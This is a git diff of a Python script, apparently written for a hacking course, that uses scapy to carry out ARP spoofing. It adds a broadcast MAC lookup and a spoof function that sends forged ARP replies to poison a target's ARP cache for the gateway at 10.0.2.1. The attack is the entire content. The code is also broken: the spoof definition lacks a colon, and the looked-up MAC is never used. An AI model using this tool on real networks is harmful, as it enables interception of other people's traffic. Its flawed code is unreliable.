@@ -23,7 +23,24 @@
 
 import scapy.all as scapy
 
+def get_mac(ip):	#modified scan function from network_scanner.py
 
-packet = scapy.ARP(op = 2, pdst = "10.0.2.8", hwdst = "08:00:27:e6:e5:59", psrc = "10.0.2.1")
+	arp_request = scapy.ARP(pdst=ip) #create an instance of scapy ARP class
+	#arp_request.show()
 
-scapy.send(packet)
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #set destination to broadcast MAC address
+	#broadcast.show()
+
+	arp_request_broadcast = broadcast/arp_request #scapy allows to combine 2 requests like this to create broadcast packet
+	#arp_request_broadcast.show()
+
+	#scapy.srp returned 2 lists, a list of addresses that answered and a list that did not answer. for this program we're only interested in the addresses that answered
+	answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # srp function will send the packet to broadcast MAC address and check all IPs provided by ip.
+	return (answered_list[0][1].hwsrc)
+
+def spoof(target_ip,spoof_ip)
+	target_mac = get_mac(target_ip)
+	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "08:00:27:e6:e5:59", psrc = spoof_ip)
+	scapy.send(packet)
+
+spoof("10.0.2.8","10.0.2.1")
